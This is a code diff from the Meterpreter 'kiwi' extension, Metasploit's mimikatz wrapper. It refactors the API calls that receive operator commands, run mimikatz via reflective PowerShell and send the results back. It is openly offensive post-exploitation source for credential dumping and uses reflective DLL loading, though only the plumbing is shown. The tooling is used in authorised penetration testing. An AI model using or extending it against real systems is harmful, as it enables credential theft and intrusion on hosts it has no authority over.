@@ -3,14 +3,16 @@
  * @brief Entry point for the kiwi extension.
  */
 
-#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
+#include "common.h" 
+#include "common_metapi.h" 
+
+// Required so that use of the API works.
+MetApi* met_api = NULL;
+
 // include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
 // but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
 // second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
 #include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
-
-// this sets the delay load hook function, see DelayLoadMetSrv.h
-EnableDelayLoadMetSrv();
 
 #include "main.h"
 
@@ -37,9 +39,9 @@ Command customCommands[] =
 DWORD request_exec_cmd(Remote *remote, Packet *packet)
 {
 	DWORD result = ERROR_SUCCESS;
-	Packet * response = packet_create_response(packet);
+	Packet * response = met_api->packet.create_response(packet);
 
-	wchar_t* cmd = packet_get_tlv_value_wstring(packet, TLV_TYPE_KIWI_CMD);
+	wchar_t* cmd = met_api->packet.get_tlv_value_wstring(packet, TLV_TYPE_KIWI_CMD);
 	if (cmd != NULL)
 	{
 		dprintf("[KIWI] Executing command: %S", cmd);
@@ -49,7 +51,7 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 		wchar_t* output = powershell_reflective_mimikatz(cmd);
 		if (output != NULL)
 		{
-			packet_add_tlv_wstring(response, TLV_TYPE_KIWI_CMD_RESULT, output);
+			met_api->packet.add_tlv_wstring(response, TLV_TYPE_KIWI_CMD_RESULT, output);
 		}
 		else
 		{
@@ -63,7 +65,7 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 	}
 
 	dprintf("[KIWI] Dumped, transmitting response.");
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	dprintf("[KIWI] Done.");
 
 	return ERROR_SUCCESS;
@@ -71,18 +73,19 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 
 /*!
  * @brief Initialize the server extension.
+ * @param api Pointer to the Meterpreter API structure.
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
+DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
 {
-	hMetSrv = remote->met_srv;
+    met_api = api;
 
 	dprintf("[KIWI] Init server extension - initorclean");
 	mimikatz_initOrClean(TRUE);
 
 	dprintf("[KIWI] Init server extension - register");
-	command_register_all(customCommands);
+	met_api->command.register_all(customCommands);
 
 	dprintf("[KIWI] Init server extension - done");
 
@@ -97,7 +100,7 @@ DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 {
 	mimikatz_initOrClean(FALSE);
-	command_deregister_all(customCommands);
+	met_api->command.deregister_all(customCommands);
 
 	return ERROR_SUCCESS;
 }
